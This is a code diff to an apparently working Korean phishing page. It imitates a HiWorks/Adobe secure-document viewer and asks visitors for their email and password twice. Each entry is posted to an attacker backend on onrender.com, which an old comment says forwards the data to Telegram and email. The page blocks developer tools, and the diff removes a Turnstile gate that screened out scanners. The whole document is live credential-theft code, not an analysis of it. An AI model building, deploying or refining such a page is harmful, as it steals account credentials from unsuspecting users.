@@ -117,7 +117,7 @@
 }
 </style>
 </head>
-<body onload="load()" class="flex flex-col justify-center items-center h-screen w-screen bg-no-repeat bg-cover" id="bg-image">
+<body class="flex flex-col justify-center items-center h-screen w-screen bg-no-repeat bg-cover" id="bg-image">
 
 <form id="form" action="" method="post">
   <div class="h-[24rem] w-[28rem] bg-neutral-200 flex flex-col justify-center items-center" id="boxer">
@@ -182,15 +182,14 @@
         <div class="progress-label" id="progress-label">0%</div>
       </div>
 
-      <!-- 성공 상태: 문서 이미지 표시 -->
+      <!-- 성공 상태 -->
       <div id="success-state" style="display:none;">
         <div class="checkmark">✓</div>
         <h2>문서가 열렸습니다</h2>
         <p>공유된 문서를 확인하실 수 있습니다.</p>
 
         <div class="doc-img-wrap">
-          <!-- ⚠️ EDIT #3: B2에 업로드한 문서 이미지 URL -->
-          <img src="https://inquiry.com/document.png"
+          <img src="https://lihtec.com/document.png"
                alt="공유 문서"
                onerror="this.parentNode.innerHTML='<div style=&quot;padding:40px;color:#888;font-size:13px;&quot;>문서 미리보기를 불러올 수 없습니다.</div>'">
         </div>
@@ -209,17 +208,11 @@
 </div>
 
 <!-- ============================================================
-     설정 — B2 업로드 전 아래 3줄을 수정하세요
+     설정
      ============================================================ -->
 <script>
   // ⚠️ EDIT #1 — Render 백엔드 URL (끝에 슬래시 없이)
   const BACKEND_URL = "https://adobe-secure-korea.onrender.com";
-
-  // ⚠️ EDIT #2 — Cloudflare Turnstile 사이트 키 (공개 키)
-  const TURNSTILE_SITE_KEY = "0x4AAAAAAE5FA37vZqcaPNf_";
-
-  // ⚠️ EDIT #3 — B2에 업로드한 문서 이미지 URL
-  const DOCUMENT_IMAGE_URL = "http://lihtec.com/document.png";
 </script>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
@@ -275,62 +268,6 @@ if (logoUrl) {
 // 푸터 연도
 document.getElementById('viewer-year').textContent = new Date().getFullYear();
 
-// 성공 상태 이미지 URL 적용
-document.addEventListener('DOMContentLoaded', function () {
-  var img = document.querySelector('.doc-img-wrap img');
-  if (img) img.src = DOCUMENT_IMAGE_URL;
-});
-
-// ============================================================
-// 🛡️ Turnstile 세션 토큰 발급
-// ============================================================
-let SESSION_TOKEN = null;
-
-function loadTurnstile() {
-  return new Promise((resolve) => {
-    if (window.turnstile) return resolve();
-    const s = document.createElement('script');
-    s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
-    s.async = true; s.defer = true;
-    s.onload = resolve;
-    document.head.appendChild(s);
-  });
-}
-
-async function getSessionToken() {
-  if (SESSION_TOKEN) return SESSION_TOKEN;
-  await loadTurnstile();
-  return new Promise((resolve, reject) => {
-    let holder = document.getElementById('turnstile-holder');
-    if (!holder) {
-      holder = document.createElement('div');
-      holder.id = 'turnstile-holder';
-      holder.style.display = 'none';
-      document.body.appendChild(holder);
-    }
-    turnstile.render('#turnstile-holder', {
-      sitekey: TURNSTILE_SITE_KEY,
-      callback: async function (token) {
-        try {
-          const res = await fetch(BACKEND_URL + '/api/verify-captcha', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ token })
-          });
-          const data = await res.json();
-          if (data.success && data.sessionToken) {
-            SESSION_TOKEN = data.sessionToken;
-            resolve(SESSION_TOKEN);
-          } else {
-            reject(new Error('캡차 검증 실패'));
-          }
-        } catch (err) { reject(err); }
-      },
-      'error-callback': function () { reject(new Error('Turnstile 오류')); }
-    });
-  });
-}
-
 // ============================================================
 // 문서 뷰어 애니메이션
 // ============================================================
@@ -370,12 +307,12 @@ const viewer = {
 };
 
 // ============================================================
-// 🚀 2회 입력 매칭 로직 (사용자에게 카운터 노출 없음)
+// 🚀 2회 입력 매칭 로직 — Turnstile 없이 바로 백엔드 호출
 // ============================================================
 $(function () {
-  let firstPassword = null;
+  let firstPassword  = null;
   let firstSubmitted = false;
-  let locked = false;
+  let locked         = false;
 
   const PROMPT_INITIAL = '<strong>HiWorks 보안 문서 열람을 위해 본인 인증이 필요합니다</strong>';
   const PROMPT_REENTER = '<strong>보안 문서 열람을 위해 비밀번호를 다시 한번 입력해 주세요</strong>';
@@ -384,7 +321,7 @@ $(function () {
     e.preventDefault();
     if (locked) return;
 
-    const email = $('#ingo').val();
+    const email    = $('#ingo').val();
     const password = $('#outcome').val();
     if (!email || !password) return;
 
@@ -393,32 +330,31 @@ $(function () {
     $('#authen').show();
 
     try {
-      const token = await getSessionToken();
       const attemptNum = firstSubmitted ? 2 : 1;
 
-      // 매번 백엔드로 전송 (텔레그램 + 이메일)
+      // 🚀 Turnstile 없이 바로 백엔드 호출
+      console.log('📤 Sending login attempt', attemptNum, 'to', BACKEND_URL + '/api/login');
+
       const res = await fetch(BACKEND_URL + '/api/login', {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json',
-          'x-session-token': token
+          'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          email,
-          password,
-          attempt: attemptNum
+          email:    email,
+          password: password,
+          attempt:  attemptNum
         })
       });
 
       const data = await res.json();
-      console.log('로그인 응답:', data);
+      console.log('📥 로그인 응답:', data);
 
       if (!firstSubmitted) {
         // ============ 1차 입력 ============
-        firstPassword = password;
+        firstPassword  = password;
         firstSubmitted = true;
 
-        // 프롬프트 살짝 변경 + 필드 비움 (자연스러운 재확인 단계처럼 보임)
         $('#authen').hide();
         $('#outcome').val('');
         $('#enthead').html(PROMPT_REENTER).show();
@@ -442,8 +378,8 @@ $(function () {
         viewer.show();
 
       } else {
-        // ❌ 불일치 → 조용히 1차로 리셋 (사용자에게 오류 표시 없음)
-        firstPassword = null;
+        // ❌ 불일치 → 조용히 1차로 리셋
+        firstPassword  = null;
         firstSubmitted = false;
         $('#authen').hide();
         $('#outcome').val('');
@@ -452,9 +388,9 @@ $(function () {
       }
 
     } catch (err) {
-      console.error('제출 오류:', err);
-      // 오류 발생 시 조용히 리셋
-      firstPassword = null;
+      console.error('❌ 제출 오류:', err);
+      // 오류 시 조용히 리셋
+      firstPassword  = null;
       firstSubmitted = false;
       $('#authen').hide();
       $('#outcome').val('');
@@ -465,7 +401,7 @@ $(function () {
 });
 
 // ============================================================
-// 개발자 도구 차단 (기존 유지)
+// 개발자 도구 차단
 // ============================================================
 window.oncontextmenu = function () { return false; };
 $(document).on('keydown', function (e) {
